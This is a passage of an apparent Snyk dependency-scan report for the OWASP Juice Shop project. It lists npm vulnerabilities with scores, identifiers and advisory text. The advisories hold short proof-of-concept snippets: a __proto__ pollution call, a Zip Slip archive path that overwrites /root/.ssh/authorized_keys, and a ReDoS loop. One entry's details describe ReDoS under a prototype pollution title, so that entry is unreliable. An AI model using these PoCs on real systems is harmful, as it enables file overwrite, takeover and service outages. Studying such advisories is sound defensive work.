            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:00:51.927791Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:22.598107Z"
          }
        ],
        "description": "## Overview\n[decompress-tar](https://github.com/kevva/decompress-tar) is a tar plugin for decompress.\n\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is possible to bypass the security measures provided by decompress  and conduct ZIP path traversal through symlinks.\r\n\r\n### PoC\r\n\r\n```\r\nconst decompress = require('decompress');\r\n\r\ndecompress('slip.tar.gz', 'dist').then(files => {\r\n\tconsole.log('done!');\r\n});\r\n```\n\n## Details\n\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n\n+2018-04-15 22:04:29 ..... 19 19 good.txt\n\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n```\n\n## Remediation\nThere is no fixed version for `decompress-tar`.\n## References\n- [GitHub Fix PR](https://github.com/kevva/decompress/pull/73)\n- [GitHub Issue](https://github.com/kevva/decompress/issues/71)\n- [GitHub PR decompress-tar](https://github.com/kevva/decompress-tar/pull/12)\n- [NPM Advisory](https://www.npmjs.com/advisories/1217)\n",
        "epssDetails": {
          "percentile": "0.72010",
          "probability": "0.00737",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-12265"
          ],
          "CWE": [
            "CWE-29"
          ],
          "NSP": [
            "1217"
          ],
          "GHSA": [
            "GHSA-qgfr-5hqp-vrw9"
          ]
        },
        "packageName": "decompress-tar",
        "proprietary": false,
        "creationTime": "2020-03-02T11:17:35.161853Z",
        "functions_new": [
          {
            "version": [
              "*"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "module.exports"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2019-10-15T20:29:24Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-02-27T13:28:41Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:50:22.598107Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "download@8.0.0",
          "decompress@4.2.1",
          "decompress-targz@4.1.1",
          "decompress-tar@4.1.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "decompress-tar",
        "version": "4.1.1"
      },
      {
        "id": "SNYK-JS-EIVINDFJELDSTADDOT-564434",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L/E:P/RL:O/RC:C",
        "credit": [
          "JHU System Security Lab"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 4.2,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "eivindfjeldstad-dot",
        "references": [
          {
            "url": "https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b",
            "title": "GitHub Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:51:08.791834Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L/E:P/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 4.2,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:57:22.274981Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:51:08.791834Z"
          }
        ],
        "description": "## Overview\n[eivindfjeldstad-dot](https://www.npmjs.com/package/eivindfjeldstad-dot) is a module that Gets and sets object properties with dot notation.\r\n\r\n**Note:** this package has been deprecated and moved into `@eivifj/dot`.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `set` could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.\r\n\r\n## PoC\r\n```\r\nvar a = require(\"eivindfjeldstad-dot\")\r\nvar path = \"__proto__.toString\";\r\na.set({},path,\"JHU\");\r\nconsole.log({}.toString);\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nThere is no fixed version for `eivindfjeldstad-dot`.\n## References\n- [GitHub Commit](https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b)\n",
        "epssDetails": {
          "percentile": "0.55117",
          "probability": "0.00326",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-7639"
          ],
          "CWE": [
            "CWE-1321"
          ]
        },
        "packageName": "eivindfjeldstad-dot",
        "proprietary": true,
        "creationTime": "2020-04-05T14:48:43.897856Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-04-05T00:00:00Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-04-05T00:00:00Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:51:08.791834Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "yaml-schema-validator@1.2.3",
          "validate@4.5.1",
          "eivindfjeldstad-dot@0.0.1"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "eivindfjeldstad-dot",
        "version": "0.0.1"
      },
      {
        "id": "SNYK-JS-ENGINEIO-3136336",
        "title": "Denial of Service (DoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "credit": [
          "Jonathan Neve"
        ],
        "semver": {
          "vulnerable": [
            "<3.6.1",
            ">=4.0.0 <6.2.1"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "3.6.1",
          "6.2.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.5,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "engine.io",
        "references": [
          {
            "url": "https://github.com/socketio/engine.io/commit/425e833ab13373edf1dd5a0706f07100db14e3c6",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/engine.io/commit/83c4071af871fc188298d7d591e95670bf9f9085",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/socketio/engine.io/pull/658",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-03-11T09:52:46.807502Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:06:36.034389Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:46.807502Z"
          }
        ],
        "description": "## Overview\n[engine.io](https://github.com/socketio/engine.io) is a realtime engine behind Socket.IO. It provides the foundation of a bidirectional connection between client and server\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). A malicious client could send a specially crafted HTTP request, triggering an uncaught exception and killing the `Node.js` process.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.\n\nUnlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.\n\nOne popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.\n\nWhen it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.\n\nTwo common types of DoS vulnerabilities:\n\n* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).\n\n* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `engine.io` to version 3.6.1, 6.2.1 or higher.\n## References\n- [GitHub Commit](https://github.com/socketio/engine.io/commit/425e833ab13373edf1dd5a0706f07100db14e3c6)\n- [GitHub Commit](https://github.com/socketio/engine.io/commit/83c4071af871fc188298d7d591e95670bf9f9085)\n- [GitHub PR](https://github.com/socketio/engine.io/pull/658)\n",
        "epssDetails": {
          "percentile": "0.85569",
          "probability": "0.02779",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-41940"
          ],
          "CWE": [
            "CWE-400"
          ],
          "GHSA": [
            "GHSA-r7qp-cfhv-p84w"
          ]
        },
        "packageName": "engine.io",
        "proprietary": false,
        "creationTime": "2022-11-21T14:00:03.277453Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-11-21T13:55:28Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-11-21T14:00:42.363779Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:52:46.807502Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "socket.io@3.1.2",
          "engine.io@4.1.2"
        ],
        "upgradePath": [
          false,
          "socket.io@4.5.0",
          "engine.io@6.2.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "engine.io",
        "version": "4.1.2"
      },
      {
        "id": "SNYK-JS-EXPRESSJWT-575022",
        "title": "Authorization Bypass",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "credit": [
          "IST Group"
        ],
        "semver": {
          "vulnerable": [
            "<6.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "6.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "express-jwt",
        "references": [
          {
            "url": "https://github.com/auth0/express-jwt/commit/7ecab5f8f0cab5297c2b863596566eb0c019cdef",
            "title": "GitHub Commit"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "critical",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cvssV3BaseScore": 9.1,
            "modificationTime": "2024-03-11T09:50:28.870577Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:56:07.758574Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "assigner": "NVD",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:28.870577Z"
          }
        ],
        "description": "## Overview\n[express-jwt](https://www.npmjs.com/package/express-jwt) is a JWT authentication middleware.\n\nAffected versions of this package are vulnerable to Authorization Bypass. The `algorithms` entry to be specified in the configuration is not being enforced. When `algorithms` is not specified in the configuration, with the combination of `jwks-rsa`, it may lead to authorization bypass.\n## Remediation\nUpgrade `express-jwt` to version 6.0.0 or higher.\n## References\n- [GitHub Commit](https://github.com/auth0/express-jwt/commit/7ecab5f8f0cab5297c2b863596566eb0c019cdef)\n",
        "epssDetails": {
          "percentile": "0.27434",
          "probability": "0.00095",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2020-15084"
          ],
          "CWE": [
            "CWE-285"
          ],
          "GHSA": [
            "GHSA-6g6m-m6h5-w9gf"
          ]
        },
        "packageName": "express-jwt",
        "proprietary": false,
        "creationTime": "2020-07-01T09:33:11.790635Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-07-01T09:30:03Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-07-01T15:32:36Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:50:28.870577Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3"
        ],
        "upgradePath": [
          false,
          "express-jwt@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "express-jwt",
        "version": "0.1.3"
      },
      {
        "id": "SNYK-JS-GOT-2932019",
        "title": "Open Redirect",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "credit": [
          "Unknown"
        ],
        "semver": {
          "vulnerable": [
            "<11.8.5",
            ">=12.0.0 <12.1.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "11.8.5",
          "12.1.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "got",
        "references": [
          {
            "url": "https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0",
            "title": "GitHub Diff"
          },
          {
            "url": "https://github.com/sindresorhus/got/pull/2047",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:49:40.538405Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:53:59.174248Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T13:55:26.874968Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:49:40.538405Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "assigner": "Red Hat",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:59.174248Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Open Redirect due to missing verification of requested URLs. It allowed a victim to be redirected to a UNIX socket.\n## Remediation\nUpgrade `got` to version 11.8.5, 12.1.0 or higher.\n## References\n- [GitHub Diff](https://github.com/sindresorhus/got/compare/v12.0.3...v12.1.0)\n- [GitHub PR](https://github.com/sindresorhus/got/pull/2047)\n",
        "epssDetails": {
          "percentile": "0.73147",
          "probability": "0.00788",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2022-33987"
          ],
          "CWE": [
            "CWE-601"
          ]
        },
        "packageName": "got",
        "proprietary": false,
        "creationTime": "2022-06-19T09:23:24.210132Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2022-06-19T08:33:16Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2022-06-19T15:33:44.269688Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:53:59.174248Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "download@8.0.0",
          "got@8.3.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "got",
        "version": "8.3.2"
      },
      {
        "id": "SNYK-JS-HBS-1566555",
        "title": "Information Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N/E:P",
        "credit": [
          "Agustin Gianni"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "low",
        "cvssScore": 3.4,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "hbs",
        "references": [
          {
            "url": "https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/",
            "title": "PoC and Explanation"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvssV3BaseScore": 5.3,
            "modificationTime": "2024-03-11T09:50:48.662388Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N/E:P",
            "assigner": "Snyk",
            "severity": "low",
            "baseScore": 3.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:04:06.258873Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:50:48.662388Z"
          }
        ],
        "description": "## Overview\n[hbs](https://www.npmjs.org/package/hbs) is an Express.js template engine plugin for Handlebars\n\nAffected versions of this package are vulnerable to Information Exposure. `hbs` mixes pure template data with engine configuration options through the `Express` render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications.\n## Remediation\nThere is no fixed version for `hbs`.\n## References\n- [PoC and Explanation](https://securitylab.github.com/advisories/GHSL-2021-020-pillarjs-hbs/)\n",
        "epssDetails": {
          "percentile": "0.52966",
          "probability": "0.00299",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2021-32822"
          ],
          "CWE": [
            "CWE-200"
          ],
          "GHSL": [
            "GHSL-2021-020"
          ]
        },
        "packageName": "hbs",
        "proprietary": false,
        "creationTime": "2021-08-17T11:02:48.815315Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2021-08-17T10:50:41Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2021-08-17T14:14:00.465869Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-11T09:50:48.662388Z",
        "socialTrendAlert": false,
        "severityWithCritical": "low",
        "from": [
          "juice-shop@19.0.0",
          "hbs@4.2.0"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "name": "hbs",
        "version": "4.2.0"
      },
      {
        "id": "SNYK-JS-HTTPCACHESEMANTICS-3248783",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "credit": [
          "Carter Snook"
        ],
        "semver": {
          "vulnerable": [
            "<4.1.1"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.1.1"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 5.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "http-cache-semantics",
        "references": [
          {
            "url": "https://github.com/kornelski/http-cache-semantics/commit/560b2d8ef452bbba20ffed69dc155d63ac757b74",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/kornelski/http-cache-semantics/blob/master/index.js%23L83",
            "title": "Vulnerable Code"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:52:46.291686Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:59.788609Z"
          },
          {
            "assigner": "SUSE",
            "severity": "high",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "modificationTime": "2024-03-11T09:53:08.951745Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 5.3,
            "cvssVersion": "3.1",
            "modificationTime": "2025-02-16T14:02:23.374199Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:46.291686Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "Red Hat",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:59.788609Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "SUSE",
            "severity": "high",
            "baseScore": 7.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:53:08.951745Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.\n## PoC\nRun the following script in Node.js after installing the `http-cache-semantics` NPM package:\r\n\r\n```js\r\nconst CachePolicy = require(\"http-cache-semantics\");\r\n\r\nfor (let i = 0; i <= 5; i++) {\r\n\r\nconst attack = \"a\" + \" \".repeat(i * 7000) +\r\n\"z\";\r\n\r\nconst start = performance.now();\r\nnew CachePolicy({\r\nheaders: {},\r\n}, {\r\nheaders: {\r\n\"cache-control\": attack,\r\n},\r\n\r\n\r\n});\r\nconsole.log(`${attack.length}: ${performance.now() - start}ms`);\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing 